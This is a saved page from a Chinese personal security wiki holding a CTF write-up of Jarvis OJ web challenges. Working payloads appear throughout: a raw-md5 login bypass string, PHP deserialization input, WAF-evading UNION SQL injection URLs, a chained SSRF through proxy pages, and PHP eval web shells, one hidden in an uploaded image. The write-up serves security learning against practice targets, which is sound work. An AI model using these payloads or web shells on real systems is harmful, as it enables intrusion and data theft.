@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Jarvis oj web部分write-up - 信息安全个人wiki&amp;blog
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>信息安全个人WIKI&amp;BLOG</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <ul>
+<li><a href="/">Home</a></li>
+<li><a href="/about">About</a></li>
+<li><a href="/note">Notes</a></li>
+</ul>
+<h1 id="web安全"><a href="#web安全" class="headerlink" title="web安全"></a><strong>web安全</strong></h1><h3 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h3><ul>
+<li><a href="/contents/xss">WebSecurity-xss</a></li>
+<li><a href="/contents/csrf">WebSecurity-csrf</a></li>
+<li><a href="/contents/ssrf">WebSecurity-ssrf</a></li>
+<li><a href="/contents/FI">WebSecurity-FI</a></li>
+<li><a href="/contents/rce">WebSecurity-rce</a></li>
+<li><a href="/contents/upload">WebSecurity-upload</a></li>
+<li><a href="/contents/xxe">WebSecurity-xxe</a></li>
+</ul>
+<h2 id="labs"><a href="#labs" class="headerlink" title="labs"></a>labs</h2><ul>
+<li><a href="/contents/xsslabs">xss-demo项目练习</a></li>
+<li><a href="/contents/sqllabs">sql-labs项目练习</a></li>
+<li><a href="/contents/uploadlabs">upload-labs系列write-up</a></li>
+<li><a href="/contents/code-breaking">code-breaking write-up</a></li>
+</ul>
+<h2 id="CTF-amp-AWD"><a href="#CTF-amp-AWD" class="headerlink" title="CTF&amp;AWD"></a>CTF&amp;AWD</h2><ul>
+<li><a href="/contents/awd">百越杯AWD攻防源码复现分析</a></li>
+<li><a href="/contents/jarvis">Jarvis oj web部分write-up</a></li>
+<li><a href="/contents/babyphp">hacklu_CTF2018 write up</a></li>
+<li><a href="/contents/suctf">suctf招新赛web全题解</a></li>
+<li><a href="/contents/shanghai">骇极杯CTF Write up</a></li>
+<li><a href="/contents/wangding">2018网鼎杯web部分write-up合集</a></li>
+</ul>
+<h2 id="实战-amp-总结"><a href="#实战-amp-总结" class="headerlink" title="实战&amp;总结"></a>实战&amp;总结</h2><ul>
+<li><a href="/contents/login">登录框渗透总结</a></li>
+<li><a href="/contents/logic">登录逻辑漏洞总结</a></li>
+<li><a href="/contents/unauthorized">未授权访问渗透总结</a></li>
+<li><a href="/contents/mysql-fileread">mysql客户端读取漏洞</a></li>
+</ul>
+<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a><strong>内网渗透</strong></h1><ul>
+<li>待补充</li>
+</ul>
+<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a><strong>代码审计</strong></h1><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><ul>
+<li><a href="/contents/variable">代码审计基础之变量覆盖漏洞</a></li>
+<li><a href="/contents/injection">代码审计基础之命令注入函数</a></li>
+<li><a href="/contents/serialize">代码审计基础之php反序列化</a></li>
+</ul>
+<h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><ul>
+<li>待补充</li>
+</ul>
+<h1 id="安全开发"><a href="#安全开发" class="headerlink" title="安全开发"></a><strong>安全开发</strong></h1><ul>
+<li><a href="/contents/tools">一些工具的使用命令</a></li>
+</ul>
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <p>Jarvis oj web部分学习笔记~<a id="more"></a> </p>
+<h2 id="翻车现场"><a href="#翻车现场" class="headerlink" title="翻车现场"></a>翻车现场</h2><h3 id="0x01-PORT51"><a href="#0x01-PORT51" class="headerlink" title="0x01 PORT51"></a>0x01 PORT51</h3><p><code>Please use port 51 to visit this site.</code></p>
+<p>根据提示还以为是访问51号端口，看了半天才反应过来用我的51端口去访问直接用命令得到flag</p>
+<p><code>sudo curl --local-port 51 web.phrack.top:32772</code></p>
+<p><img src="/img/jarvis_1.png" alt=""></p>
+<h3 id="0x02-LOCALHOST"><a href="#0x02-LOCALHOST" class="headerlink" title="0x02 LOCALHOST"></a>0x02 LOCALHOST</h3><p><code>localhost access only!!</code>根据提示改<code>X-Forwarded-For</code>即可，或者用火狐的工具</p>
+<p><code>Yeah!! Here&#39;s your flag:PCTF{X_F0rw4rd_F0R_is_not_s3cuRe}</code></p>
+<h3 id="0x03-Login"><a href="#0x03-Login" class="headerlink" title="0x03 Login"></a>0x03 Login</h3><p>打开是一个输入<code>password</code>的框，尝试爆破无果，在<code>header</code>中发现</p>
+<p><code>select * from admin where password=&#39;&quot;.md5($pass,true).&quot;&#39;</code></p>
+<p><a href="http://www.am0s.com/functions/204.html" target="_blank" rel="noopener">参考链接</a></p>
+<p>输入字符串:<code>ffifdyop</code>即可得到flag</p>
+<p><code>Correct pass!! Your Flag: PCTF{R4w_md5_is_d4ng3rous}</code> </p>
+<h3 id="0x04-神盾局的秘密"><a href="#0x04-神盾局的秘密" class="headerlink" title="0x04 神盾局的秘密"></a>0x04 神盾局的秘密</h3><p>右键查看源代码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"showimg.php?img=c2hpZWxkLmpwZw=="</span> <span class="attr">width</span>=<span class="string">"100%"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>下意识反应到文件包含，读一下几个相关文件得到</p>
+<p><code>index.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br><span class="line">	$x = <span class="keyword">new</span> Shield();</span><br><span class="line">	<span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">		$x = unserialize($g);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> $x-&gt;readfile();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>showing.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$f = $_GET[<span class="string">'img'</span>];</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">empty</span>($f)) &#123;</span><br><span class="line">		$f = base64_decode($f);</span><br><span class="line">		<span class="keyword">if</span> (stripos($f,<span class="string">'..'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'\\'</span>)===<span class="keyword">FALSE</span></span><br><span class="line">		&amp;&amp; stripos($f,<span class="string">'pctf'</span>)===<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">			readfile($f);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"File not found!"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>Shield.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">//flag is in pctf.php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $file;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span><br><span class="line">			&amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">				<span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>直接读<code>pctf.php</code>无果，后来看到反序列化的点<code>$x = unserialize($g);</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$obj=<span class="keyword">new</span> Shield();</span><br><span class="line">$obj-&gt;file=<span class="string">"pctf.php"</span>;</span><br><span class="line">$obj2=serialize($obj);</span><br><span class="line">print_r($obj2);</span><br></pre></td></tr></table></figure>
+
+<p>得到<code>O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code>构造<code>url</code>中<code>class</code>为这一串</p>
+<p><img src="/img/jarvis_2.png" alt=""></p>
+<h3 id="0x05-IN-A-Mess"><a href="#0x05-IN-A-Mess" class="headerlink" title="0x05 IN A Mess"></a>0x05 IN A Mess</h3><p>源代码发现<code>index.phps</code>泄露</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;!--index.phps--&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])</span><br><span class="line">&#123;</span><br><span class="line">	header(<span class="string">'Location: index.php?id=1'</span>);</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Hahahahahaha'</span>;</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">"1112 is a nice lab!"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">require</span>(<span class="string">"flag.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"work harder!harder!harder!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>观察源码我们可以知道</p>
+<p>id为字符要绕过<code>==0</code>，可用<code>0b</code>或者任何一个字母绕过</p>
+<p>a为一个文件，且文件内容为<code>1112 is a nice lab!</code>，用<code>php://input</code>绕过</p>
+<p>b的长度要大于5且<code>eregi</code>要匹配b的第一位为4而<code>substr</code>要匹配b的第一位不为4</p>
+<p>这里可以<code>%00</code>截断<code>%00</code>在传入<code>url</code>后<code>webserver</code>会通过16进制解析成为空字符从而绕过<code>eregi</code>和<code>substr</code>的匹配</p>
+<p>且长度大于5<code>http://web.jarvisoj.com:32780/index.php?id=a&amp;a=php://input&amp;b=%0012345</code></p>
+<p>得到﻿<code>Come ON!!! {/^HT2mCpcvOLf}</code> </p>
+<p>这一串像<code>url</code>点进去是一个<code>sql</code>注入页面，有<code>waf</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*12*&#x2F;代替空格</span><br><span class="line">union和select双写绕过</span><br></pre></td></tr></table></figure>
+
+<p>测试后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;web.jarvisoj.com:32780&#x2F;%5EHT2mCpcvOLf&#x2F;index.php?id&#x3D;1&#x2F;*12*&#x2F;order&#x2F;*12*&#x2F;by&#x2F;*12*&#x2F;3 查字段</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;web.jarvisoj.com:32780&#x2F;%5EHT2mCpcvOLf&#x2F;index.php?</span><br><span class="line">id&#x3D;-1&#x2F;*12*&#x2F;uniunionon&#x2F;*12*&#x2F;selselectect&#x2F;*12*&#x2F;1,2,database()&#x2F;*12*&#x2F;%23  得到database为test</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;web.jarvisoj.com:32780&#x2F;%5EHT2mCpcvOLf&#x2F;index.php?id&#x3D;-1&#x2F;*12*&#x2F;uniunionon&#x2F;*12*&#x2F;selselectect&#x2F;*12*&#x2F;1,2,group_concat(table_name)&#x2F;*12*&#x2F;frfromom&#x2F;*12*&#x2F;information_schema.tables&#x2F;*12*&#x2F;where&#x2F;*12*&#x2F;table_schema&#x3D;database()&#x2F;*12*&#x2F;%23  得到表名为content</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;web.jarvisoj.com:32780&#x2F;^HT2mCpcvOLf&#x2F;index.php?id&#x3D;-1&#x2F;*12*&#x2F;uniunionon&#x2F;*12*&#x2F;selselectect&#x2F;*12*&#x2F;1,2,group_concat(column_name)&#x2F;*12*&#x2F;frfromom&#x2F;*12*&#x2F;information_schema.columns&#x2F;*12*&#x2F;where&#x2F;*12*&#x2F;table_name&#x3D;0x636f6e74656e74#  得到字段id,context,title</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;web.jarvisoj.com:32780&#x2F;^HT2mCpcvOLf&#x2F;index.php?id&#x3D;-1&#x2F;*12*&#x2F;uniunionon&#x2F;*12*&#x2F;selselectect&#x2F;*12*&#x2F;1,2,group_concat(id,0x3a,context,0x3a,title)&#x2F;*12*&#x2F;frfromom&#x2F;*12*&#x2F;content#  得到flag  1:PCTF&#123;Fin4lly_U_got_i7_C0ngRatulation5&#125;:hi666</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x06-RE"><a href="#0x06-RE" class="headerlink" title="0x06 RE?"></a>0x06 RE?</h3><p>下载下来一个<code>udf.so.XXXXX</code>，用<code>mysql</code>导入一下</p>
+<p>具体过程如下。</p>
+<p>将<code>udf</code>文件放到<code>/usr/lib/mysql/plugin/</code>文件夹中：</p>
+<p><code>/usr/lib/mysql/plugin# wget https://dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172</code></p>
+<p>登陆<code>mysql</code>后，加载<code>help_me</code>函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create function help_me returns string soname &#39;udf.so.02f8981200697e5eeb661e64797fc172&#39;;</span><br><span class="line">Query OK, 0 rows affected (2.04 sec)</span><br></pre></td></tr></table></figure>
+
+<p>利用help_me函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select help_me();</span><br><span class="line">+-------------------------------------------------------+</span><br><span class="line">| help_me()                                                  |</span><br><span class="line">+-------------------------------------------------------+</span><br><span class="line">| use getflag function to obtain your flag!!   |</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">1 row in set (0.17 sec)</span><br></pre></td></tr></table></figure>
+
+<p>利用<code>udf</code>再创建一个<code>getflag</code>函数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create function getflag returns string soname &#39;udf.so.02f8981200697e5eeb661e64797fc172&#39;;</span><br><span class="line">Query OK, 0 rows affected (0.05 sec)</span><br></pre></td></tr></table></figure>
+
+<p>得到flag：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select getflag();</span><br><span class="line">+-------------------------------------------------------+</span><br><span class="line">| getflag()                                                     |</span><br><span class="line">+-------------------------------------------------------+</span><br><span class="line">| PCTF&#123;Interesting_U5er_d3fined_Function&#125;</span><br><span class="line">                                                                    |</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x07-flag在管理员手里"><a href="#0x07-flag在管理员手里" class="headerlink" title="0x07 flag在管理员手里"></a>0x07 flag在管理员手里</h3><p>随便抓一个包</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UM_distinctid=<span class="number">16299221</span>d0830<span class="number">-0</span>c8ee68046187a<span class="number">-40544130</span><span class="number">-1</span>fa400<span class="number">-16299221</span>d09234; </span><br><span class="line">role=s:<span class="number">5</span>:<span class="string">"guest"</span>;; </span><br><span class="line">hsh=<span class="number">3</span>a4727d57463f122833d9e732f94e4e0</span><br></pre></td></tr></table></figure>
+
+<p>猜测是hash长度扩展攻击</p>
+<p>后面发现源代码泄露<code>index.php~</code></p>
+<p>同时用vim修复<code>vim -r index.php.swp</code></p>
+<p>得到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">                $auth = <span class="keyword">false</span>;</span><br><span class="line">                $role = <span class="string">"guest"</span>;</span><br><span class="line">                $salt =</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"role"</span>])) &#123;</span><br><span class="line">                        $role = unserialize($_COOKIE[<span class="string">"role"</span>]);</span><br><span class="line">                        $hsh = $_COOKIE[<span class="string">"hsh"</span>];</span><br><span class="line">                        <span class="keyword">if</span> ($role===<span class="string">"admin"</span> &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[<span class="string">"role"</span>]))) &#123;</span><br><span class="line">                                $auth = <span class="keyword">true</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                $auth = <span class="keyword">false</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        $s = serialize($role);</span><br><span class="line">                        setcookie(<span class="string">'role'</span>,$s);</span><br><span class="line">                        $hsh = md5($salt.strrev($s));</span><br><span class="line">                        setcookie(<span class="string">'hsh'</span>,$hsh);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Welcome Admin. Your flag is </span></span><br><span class="line"><span class="string">                &#125; else &#123; </span></span><br><span class="line"><span class="string">                        echo "</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class="string">";</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">        ?&gt;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后。。。然后就做不下去了</p>
+<h3 id="0x08-Chopper"><a href="#0x08-Chopper" class="headerlink" title="0x08 Chopper"></a>0x08 Chopper</h3><p>点进去发现要管理员才可以登陆，收集一波信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxy.php?url&#x3D;http:&#x2F;&#x2F;dn.jarvisoj.com&#x2F;static&#x2F;images&#x2F;proxy.jpg</span><br><span class="line">&lt;!--&lt;script&gt;alert(&#39;admin ip is 103.27.76.153&#39;)&lt;&#x2F;script&gt;--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>尝试伪造<code>X-Forwarded-For</code>无果</p>
+<p>看到<code>proxy</code>想到代理于是尝试用<code>proxy</code>代理到<code>103.27.76.153</code>的<code>proxy</code>再代理到源网站的目录查找<code>flag</code></p>
+<p>具体<code>payload</code>如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;web.jarvisoj.com:32782&#x2F;proxy.php?url&#x3D;http:&#x2F;&#x2F;103.27.76.153&#x2F;proxy.php?url&#x3D;http:&#x2F;&#x2F;web.jarvisoj.com:32782&#x2F;admin&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p> 但是题目本身挂了，我们可以在本机复现一下这个原理</p>
+<p><code>1.php</code>和<code>2.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo file_get_contents($_GET[&#39;file&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>3.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_GET[&#39;x&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>payload</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/test/1.php?file=http://localhost/test/2.php?file=http://localhost/test/3.php?x=system('whoami');</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/jarvis_3.png" alt=""></p>
+<p>可以看到执行了命令了</p>
+<h3 id="0x09-Easy-Gallery"><a href="#0x09-Easy-Gallery" class="headerlink" title="0x09 Easy Gallery"></a>0x09 Easy Gallery</h3><p>页面是一个上传页面，尝试各种花式上传，最后发现<code>php</code>文件全被<code>ban</code>了，这种情况就只能上传一个图片马了</p>
+<p>得到<code>图片ID：1536585123</code> </p>
+<p><img src="/img/jarvis_4.png" alt=""></p>
+<p>在<code>view</code>页面查看图片可以看到图片的绝对路径<code>uploads/1536585123.jpg</code> </p>
+<p>用菜刀进行连接发现<code>gg</code>。。</p>
+<p>在首页<code>http://web.jarvisoj.com:32785/index.php?page=view&#39;</code>测试发现存在文件包含</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Warning: fopen(view<span class="string">'.php): failed to open stream: No such file or directory in /opt/lampp/htdocs/index.php on line 24</span></span><br><span class="line"><span class="string">No such file!</span></span><br></pre></td></tr></table></figure>
+
+<p>于是猜测是否可以通过远程包含访问到这个文件</p>
+<p><code>http://web.jarvisoj.com:32785/index.php?page=uploads/1536585123.jpg</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Warning: fopen(uploads/<span class="number">1536585123.</span>jpg.php): failed to open stream: No such file <span class="keyword">or</span> directory in /opt/lampp/htdocs/index.php on line <span class="number">24</span></span><br><span class="line">No such file!</span><br></pre></td></tr></table></figure>
+
+<p>后面多了个<code>.php</code>用00截断得到<code>You should not do this!</code> </p>
+<p>应该是后台过滤了<code>&lt;?php?&gt;</code></p>
+<p>换成<code>&lt;script language=&quot;php&quot;&gt;eval($_POST[1]);&lt;/script&gt;</code>再试一下</p>
+<p><img src="/img/jarvis_5.png" alt=""></p>
+<p>成功了，但是菜刀还是不能连上，应该是没办法解析<code>jpg</code>吧</p>
